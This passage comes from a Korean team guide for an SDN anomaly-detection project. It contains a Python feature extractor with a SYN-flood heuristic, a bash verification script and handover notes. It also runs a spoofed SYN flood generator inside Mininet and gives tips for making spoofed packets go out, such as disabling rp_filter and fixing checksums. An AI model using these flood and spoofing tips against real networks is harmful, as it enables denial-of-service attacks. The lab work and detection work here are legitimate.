3. CSV 데이터 로거 기능:
   - 계산된 피처 행을 `data/traffic_features.csv`에 추가(append) 기록 (헤더: timestamp, dpid, port_no, delta_pps, delta_bps, bpp, delta_ratio, label)
   - label: 수동 주입 모드에 따라 0(정상) 또는 1(공격) 태깅 지원
4. 간이 이상치 판별기 (Heuristic Rule Baseline):
   - 머신러닝 도입 전 1주차 검증용으로 `bpp < 100 and delta_pps > 500` 일 때 이상 판정 및 Redis `sdn:anomaly:alert` 발행 연동
5. 단독 실행 테스트(main) 코드 포함: 가상의 통계 틱 10개를 주입하여 피처 계산 및 CSV 저장이 정상 동작함을 검증할 것.
```

#### 📄 완성 참조 구현 코드 (`B/pipeline/feature_extractor.py`)
```python
#!/usr/bin/env python3
"""
[개발자 B] 5대 SDN 표준 파생 피처 추출기 및 데이터 로거 (Feature Extractor)
- 목적: 누적 카운터 -> 초당 변화량(Delta) 및 BPP 계산, CSV 저장 및 1차 룰 기반 이상치 감지
"""
import csv
import json
import os
import time
from typing import Dict, Any, Optional

class TrafficFeatureExtractor:
    def __init__(self, csv_filepath: str = "data/traffic_features.csv"):
        self.history: Dict[str, Dict[str, Any]] = {}
        self.csv_filepath = csv_filepath
        self._init_csv()

    def _init_csv(self):
        """CSV 헤더 초기화"""
        csv_dir = os.path.dirname(self.csv_filepath)
        if csv_dir:
            os.makedirs(csv_dir, exist_ok=True)
        if not os.path.exists(self.csv_filepath):
            with open(self.csv_filepath, mode="w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow([
                    "timestamp", "dpid", "port_no", 
                    "delta_pps", "delta_bps", "bpp", "delta_ratio", "rx_errors", "label"
                ])

    def extract_features(self, stats: Dict[str, Any], label: int = 0) -> Optional[Dict[str, Any]]:
        """
        포트 통계 딕셔너리로부터 5대 파생 피처 계산
        stats 예시: {"timestamp": 1700..., "dpid": "00...01", "port_no": 1, "rx_packets": 100, ...}
        """
        key = f"{stats['dpid']}_{stats['port_no']}"
        now_ts = stats.get("timestamp", time.time())
        rx_pkts = stats["rx_packets"]
        tx_pkts = stats["tx_packets"]
        rx_bytes = stats["rx_bytes"]
        rx_errs = stats.get("rx_errors", 0)

        if key not in self.history:
            # 최초 관측 시에는 기준점으로만 저장하고 피처 계산 유예
            self.history[key] = {
                "timestamp": now_ts,
                "rx_packets": rx_pkts,
                "tx_packets": tx_pkts,
                "rx_bytes": rx_bytes,
                "rx_errors": rx_errs
            }
            return None

        prev = self.history[key]
        delta_t = max(now_ts - prev["timestamp"], 0.001)
        delta_rx_pkts = max(rx_pkts - prev["rx_packets"], 0)
        delta_tx_pkts = max(tx_pkts - prev["tx_packets"], 0)
        delta_rx_bytes = max(rx_bytes - prev["rx_bytes"], 0)
        delta_errs = max(rx_errs - prev["rx_errors"], 0)

        # 1. Delta PPS (초당 패킷 수)
        delta_pps = float(delta_rx_pkts / delta_t)

        # 2. Delta BPS (초당 비트 수)
        delta_bps = float((delta_rx_bytes * 8) / delta_t)

        # 3. BPP (Bytes Per Packet, 핵심 피처)
        bpp = float(delta_rx_bytes / delta_rx_pkts) if delta_rx_pkts > 0 else 0.0

        # 4. Delta Ratio (RX / TX 패킷 비율)
        delta_ratio = float(delta_rx_pkts / (delta_tx_pkts + 1))

        # [안전 변환] 원시 파이썬 타입 보장 (NumPy JSON TypeError 방어)
        feature_record = {
            "timestamp": float(now_ts),
            "dpid": str(stats["dpid"]),
            "port_no": int(stats["port_no"]),
            "delta_pps": round(delta_pps, 2),
            "delta_bps": round(delta_bps, 2),
            "bpp": round(bpp, 2),
            "delta_ratio": round(delta_ratio, 2),
            "rx_errors": int(delta_errs),
            "label": int(label)
        }

        # 히스토리 갱신
        self.history[key] = {
            "timestamp": now_ts,
            "rx_packets": rx_pkts,
            "tx_packets": tx_pkts,
            "rx_bytes": rx_bytes,
            "rx_errors": rx_errs
        }

        # CSV 파일에 저장
        self._append_to_csv(feature_record)
        return feature_record

    def _append_to_csv(self, record: Dict[str, Any]):
        with open(self.csv_filepath, mode="a", newline="") as f:
            writer = csv.writer(f)
            writer.writerow([
                record["timestamp"], record["dpid"], record["port_no"],
                record["delta_pps"], record["delta_bps"], record["bpp"],
                record["delta_ratio"], record["rx_errors"], record["label"]
            ])

    def evaluate_heuristic_threat(self, features: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """1주차 간이 룰 기반 이상치 감지기 (SYN Flood: 폭발적 PPS + 초소형 BPP)"""
        if features["bpp"] > 0 and features["bpp"] < 100.0 and features["delta_pps"] > 500.0:
            return {
                "timestamp": features["timestamp"],
                "target_dpid": features["dpid"],
                "suspect_port": features["port_no"],
                "anomaly_score": -0.92,
                "threat_type": "SYN_FLOOD_SPOOFING",
                "metrics": {
                    "pps": int(features["delta_pps"]),
                    "bps": int(features["delta_bps"]),
                    "bpp": float(features["bpp"])
                },
                "action_required": "IN_PORT_DROP"
            }
        return None

def run_self_test():
    """모듈 자가 단위 테스트"""
    print("[*] Feature Extractor 단위 테스트 시작...")
    extractor = TrafficFeatureExtractor(csv_filepath="data/test_features.csv")

    # 시나리오 1: 정상 웹 트래픽 (2초 간격, 큰 바이트, 낮은 PPS)
    extractor.extract_features({"dpid": "0000000000000001", "port_no": 1, "rx_packets": 100, "tx_packets": 100, "rx_bytes": 80000, "timestamp": 10.0})
    normal_feat = extractor.extract_features({"dpid": "0000000000000001", "port_no": 1, "rx_packets": 200, "tx_packets": 190, "rx_bytes": 160000, "timestamp": 12.0}, label=0)
    print(f"[+] 정상 트래픽 피처: PPS={normal_feat['delta_pps']}, BPP={normal_feat['bpp']} Bytes (예상: 800 Bytes)")

    # 시나리오 2: SYN Flooding 공격 (2초 간격, 작은 바이트, 폭발적 PPS)
    extractor.extract_features({"dpid": "0000000000000001", "port_no": 2, "rx_packets": 10, "tx_packets": 10, "rx_bytes": 600, "timestamp": 10.0})
    attack_feat = extractor.extract_features({"dpid": "0000000000000001", "port_no": 2, "rx_packets": 5010, "tx_packets": 15, "rx_bytes": 300600, "timestamp": 12.0}, label=1)
    print(f"[+] 공격 트래픽 피처: PPS={attack_feat['delta_pps']}, BPP={attack_feat['bpp']} Bytes (예상: 60 Bytes)")

    # 이상치 판정 검증
    threat = extractor.evaluate_heuristic_threat(attack_feat)
    assert threat is not None, "공격 트래픽이 감지되어야 합니다!"
    print(f"[+] [감지 성공] Threat: {threat['threat_type']} | Score: {threat['anomaly_score']}")
    
    # 임시 파일 정리
    if os.path.exists("data/test_features.csv"):
        os.remove("data/test_features.csv")
    print("[*] Feature Extractor 단위 테스트 완벽 통과!")

if __name__ == "__main__":
    run_self_test()
```

---

### Step 5: 1주차 E2E 검증 (독립 단위 테스트 + Mininet 호스트 연동 + 자동화 검증)

#### 🎯 작업 목표
작성된 트래픽 생성기(`traffic_normal.py`, `traffic_attack.py`)와 피처 추출기(`feature_extractor.py`), 그리고 Redis 연동 상태를 한 번에 검증하는 1주차 자동 통합 검증 쉘 스크립트 `scripts/verify_week1_b.sh`를 작성하고 최종 통과합니다.

#### 💬 AI 프롬프트 (Step 5)
```text
개발자 B의 1주차 전 과정을 자동 검증하는 쉘 스크립트 `scripts/verify_week1_b.sh`를 작성해줘.

[검증 항목 5단계]
1. Python 가상환경(venv-ai) 유효성 및 패키지 설치 확인 (scikit-learn, scapy, pandas, numpy, redis)
2. Redis 컨테이너(127.0.0.1:6379) PING 및 채널 Pub/Sub 테스트 (`scripts/test_redis_pubsub.py`)
3. `pipeline/feature_extractor.py` 단위 테스트 실행 및 피처 계산 검증
4. `traffic/traffic_normal.py` 3초간 모의 실행 후 BPP가 500 이상인지 확인
5. `traffic/traffic_attack.py` 3초간 모의 실행 후 BPP가 100 이하, PPS가 500 이상인지 확인
6. 모든 테스트 통과 시 "[SUCCESS] Developer B Week 1 Milestone Completed!" 출력
```

#### 📄 완성 참조 검증 스크립트 (`B/scripts/verify_week1_b.sh`)
```bash
#!/usr/bin/env bash
set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BASE_DIR="$(dirname "$SCRIPT_DIR")"
cd "$BASE_DIR"

echo "========================================================"
echo "   🛡️ [개발자 B] 1주차 AI & 보안 파이프라인 마일스톤 검증"
echo "========================================================"

# 1. 가상환경 확인
echo -n "[Check 1/5] Python 가상환경(venv-ai) 확인... "
if [ ! -d "venv-ai" ]; then
    echo "FAILED (venv-ai가 없습니다. scripts/setup_env.sh 를 먼저 실행하세요.)"
    exit 1
fi
source venv-ai/bin/activate
echo "OK (Python $(python3 --version | cut -d' ' -f2))"

# 2. Redis 브로커 연결 검증
echo -n "[Check 2/5] Redis 브로커 연결 및 Pub/Sub 채널 검증... "
python3 scripts/test_redis_pubsub.py > /dev/null 2>&1 || {
    echo "FAILED"
    echo "  -> Redis 서버(127.0.0.1:6379)에 연결할 수 없습니다."
    echo "  -> 'cd ../A && docker compose up -d redis-broker' 실행 후 다시 시도하세요."
    exit 1
}
echo "OK"

# 3. 피처 추출기 및 이상치 판별 단위 테스트
echo -n "[Check 3/5] 5대 파생 피처 계산기 및 데이터 로거 검증... "
python3 pipeline/feature_extractor.py > /dev/null 2>&1 || {
    echo "FAILED"
    exit 1
}
echo "OK (정상 BPP > 500B, 공격 BPP < 100B 확인)"

# 4. Scapy 정상 트래픽 생성기 단위 검증 (3초간 실행)
echo -n "[Check 4/5] Scapy 정상 트래픽 생성기(traffic_normal.py) 실행 검증... "
sudo -E env "PATH=$PATH" python3 traffic/traffic_normal.py --duration 3 --pps 20 > /tmp/normal_test.log 2>&1 || true
if grep -q "정상 트래픽 전송 요약 보고서" /tmp/normal_test.log && ! grep -q "총 전송 패킷 수    : 0 pkts" /tmp/normal_test.log; then
    echo "OK"
else
    echo "FAILED (로그 확인: cat /tmp/normal_test.log)"
    exit 1
fi

# 5. Scapy IP 변조 SYN Flooding 공격기 단위 검증 (3초간 실행)
echo -n "[Check 5/5] Scapy IP 스푸핑 SYN Flood 공격기(traffic_attack.py) 실행 검증... "
sudo -E env "PATH=$PATH" python3 traffic/traffic_attack.py --duration 3 --pps 500 > /tmp/attack_test.log 2>&1 || true
if grep -q "SYN Flooding 공격 종료 보고서" /tmp/attack_test.log && ! grep -q "전송된 공격 패킷 수: 0 pkts" /tmp/attack_test.log; then
    echo "OK"
else
    echo "FAILED (로그 확인: cat /tmp/attack_test.log)"
    exit 1
fi

echo "========================================================"
echo " 🎉 [SUCCESS] 개발자 B 1주차 모든 개발 항목 및 마일스톤 완벽 달성!"
echo "    - 정상 및 공격 트래픽 생성기 준비 완료"
echo "    - 5대 핵심 SDN 피처 추출 및 CSV 파이프라인 검증 완료"
echo "    - Redis IPC 프로토콜 연동 준비 완료"
echo "========================================================"
```

#### 🛠️ 실행 및 최종 검증
```bash
cd /home/tlgus/programming/textgg/Developer/B
chmod +x scripts/verify_week1_b.sh
./scripts/verify_week1_b.sh
```

---

### 💡 Mininet 토폴로지와 연계하여 실전 주입하는 방법

개발자 A가 `Developer/A/topo/diamond_topo.py`로 Mininet 환경을 구동한 후, 개발자 B의 스크립트를 Mininet 가상 호스트 네임스페이스에 주입하는 실전 방법입니다.

```bash
# 1. 개발자 A 터미널 (Mininet CLI 실행 중)
cd /home/tlgus/programming/textgg/Developer/A
sudo -E env "PATH=$PATH" python3 topo/diamond_topo.py

# 2. Mininet CLI 내에서 개발자 B 스크립트 백그라운드 구동
mininet> h_legit python3 /home/tlgus/programming/textgg/Developer/B/traffic/traffic_normal.py --dst 10.0.0.4 --pps 30 &
mininet> h_attacker python3 /home/tlgus/programming/textgg/Developer/B/traffic/traffic_attack.py --target 10.0.0.4 --pps 1500 --duration 10 &

# 3. 스위치 S1의 포트별 패킷 카운트 실시간 확인
mininet> sh ovs-ofctl dump-ports s1 -O OpenFlow13
```

---

## 4. 개발자 B 전용 치명적 함정 & 디버깅 체크리스트

| # | 문제 현상 / 에러 메시지 | 근본 원인 | 해결책 및 방어 코드 |
|---|---|---|---|
| **1** | Scapy 공격 스크립트를 돌려도 OVS 스위치로 트래픽이 유입되지 않음 | Mininet 호스트 네임스페이스(`netns`)가 아닌 **호스트 OS 기본 터미널에서 Scapy를 실행**하여 물리 NIC(eth0 등)로 패킷이 나감 | 반드시 `mininet> h_attacker python3 traffic_attack.py` 형태로 Mininet CLI 내부에서 실행하거나, `sudo mnexec -a <PID>`로 네임스페이스 진입 후 실행. |
| **2** | 수신 호스트(Server)에서 패킷이 조용히 폐기됨 (Silent Drop) | 리눅스 veth 드라이버의 **Checksum Offload**로 인해 Scapy 패킷 체크섬이 0 또는 틀린 채 전송됨 | 패킷 전송 전 `del pkt[IP].chksum; del pkt[TCP].chksum`을 호출하여 Scapy가 올바른 체크섬을 계산하도록 강제. |
| **3** | IP 스푸핑 패킷이 스위치로 나가지 못하고 커널에서 사라짐 | 리눅스 커널의 **역방향 경로 필터링(`rp_filter`)**이 켜져 있어 가상 IP 패킷을 즉시 폐기 | 호스트 터미널에서 `sudo sysctl -w net.ipv4.conf.all.rp_filter=0` 및 `sudo sysctl -w net.ipv4.conf.default.rp_filter=0` 적용. |
| **4** | Redis에 JSON 데이터 발행 시 `TypeError: Object of type int64 is not JSON serializable` | NumPy 연산 또는 Scikit-learn 추론 결과 타입(`np.float64`, `np.int64`)을 표준 `json.dumps()`가 직렬화하지 못함 | 데이터 직렬화 전 `float(metric)`, `int(metric)`으로 원시 파이썬 타입 강제 변환. |
| **5** | Scapy 공격 스크립트 실행 시 CPU 100% 치솟고 Mininet 전체가 멈춤 | `time.sleep()` 없는 무한 루프로 패킷을 쏘아 단일 코어를 100% 점유 | 배치(Batch) 단위 슬립 로직(`batch_size` & `time.sleep(interval)`)을 적용하여 목표 PPS를 정밀하게 추종. |
| **6** | `sudo python3 traffic_attack.py` 실행 시 `ModuleNotFoundError: No module named 'scapy'` | sudo 실행 시 가상환경(`venv-ai`)의 PATH 환경변수가 유실됨 | `sudo -E env "PATH=$PATH" python3 traffic_attack.py` 로 가상환경 경로 상속 실행. |
| **7** | `ZeroDivisionError: float division by zero` 발생 | 통계 수집 간격 $\Delta t=0$ 이거나, 패킷 증가량 $\Delta \text{packets}=0$ 일 때 BPP 계산 시도 | `delta_t = max(now_ts - prev_ts, 0.001)`, `bpp = delta_bytes / delta_pkts if delta_pkts > 0 else 0.0` 방어. |

---

## 5. 팀원(개발자 A, C) 인계 사항 및 1주차 완료 보고서 양식

### 5.1 개발자 A (SDN 인프라 엔지니어)에게 인계할 사항
1. **모의 트래픽 주입 준비 완료:**
   - H_legit (10.0.0.1, Port 1) 전용 정상 트래픽 발생기 준비 완료 (BPP: ~800 Bytes, PPS: ~30).
   - H_attacker (10.0.0.2, Port 2) 전용 무작위 IP 스푸핑 SYN Flooding 발생기 준비 완료 (BPP: ~60 Bytes, PPS: 1,000~5,000 제어 가능).
2. **2주차 연동 요청 사항:**
   - Ryu가 2초 주기로 수집하는 `OFPPortStatsReply`를 Redis 채널 `sdn:stats:port`로 정해진 JSON 스키마에 맞춰 브로드캐스팅해 주면, 개발자 B의 실시간 피처 추출기가 이를 즉시 수신하여 처리 가능.

### 5.2 개발자 C (웹 관제탑 풀스택 엔지니어)에게 인계할 사항
1. **이상치 경보 JSON 규격 확정 (`sdn:anomaly:alert`):**
   ```json
   {
     "timestamp": 1773468010.500,
     "target_dpid": "0000000000000001",
     "suspect_port": 2,
     "anomaly_score": -0.92,
     "threat_type": "SYN_FLOOD_SPOOFING",
     "metrics": {
       "pps": 4500,
       "bps": 2800000,
       "bpp": 77.7
     },
     "action_required": "IN_PORT_DROP"
   }
   ```
   웹 관제탑의 이벤트 타임라인 및 토폴로지 경보 팝업 컴포넌트는 위 규격에 맞춰 개발 진행 가능.

---

### 5.3 [주간 회의용] 개발자 B 1주차 완료 보고 양식 (슬랙/노션 공유용)
```markdown
### 🧠 [개발자 B] 1주차 AI & 보안 파이프라인 개발 완료 보고

1. **완료 작업 요약:**
   - [x] Python 3.10 호스트 가상환경(`venv-ai`) 구축 및 머신러닝 라이브러리(Scikit-learn 1.3, Scapy 2.5, Redis 5.0) 버전 고정 설치 완료
   - [x] Scapy 정상 트래픽 생성기(`traffic/traffic_normal.py`) 구현 (HTTP GET/대용량/Ping 모사, 평균 BPP 800+ Bytes 확보)
   - [x] Scapy 랜덤 IP 변조 SYN Flooding 공격기(`traffic/traffic_attack.py`) 구현 (Checksum Offload 방어 완료, BPP 60 Bytes 급감 확인)
   - [x] SDN 5대 표준 파생 피처 계산 엔진 및 머신러닝 학습용 CSV 로거(`pipeline/feature_extractor.py`) 구현 완료
   - [x] Redis 7.2 IPC Pub/Sub 통신 규격(`sdn:stats:port`, `sdn:anomaly:alert`) 테스트 및 NumPy JSON 직렬화 방어 완료
   - [x] 1주차 자동화 종합 검증 스크립트(`scripts/verify_week1_b.sh`) 전 항목 통과 완료

2. **2주차 개발 계획:**
   - Ryu의 `sdn:stats:port` 실시간 Redis 스트림 구독 파이프라인 연결
   - 정상/공격 트래픽 수집 데이터를 기반으로 Scikit-learn `Isolation Forest` 모델 학습 및 joblib 모델 직렬화
   - 실시간 이상 탐지 추론 워커(`ai_worker.py`) 프로토타입 작성 및 탐지 스코어 임계치(Threshold) 튜닝

3. **팀원 공유 사항:**
   - Mininet 상에서 트래픽 주입 시 호스트 네임스페이스(`mininet> h_attacker python3 ...`) 내에서 실행 필수
   - 호스트 머신의 `rp_filter` 비활성화 상태 확인 요망 (`sysctl net.ipv4.conf.all.rp_filter`)
```
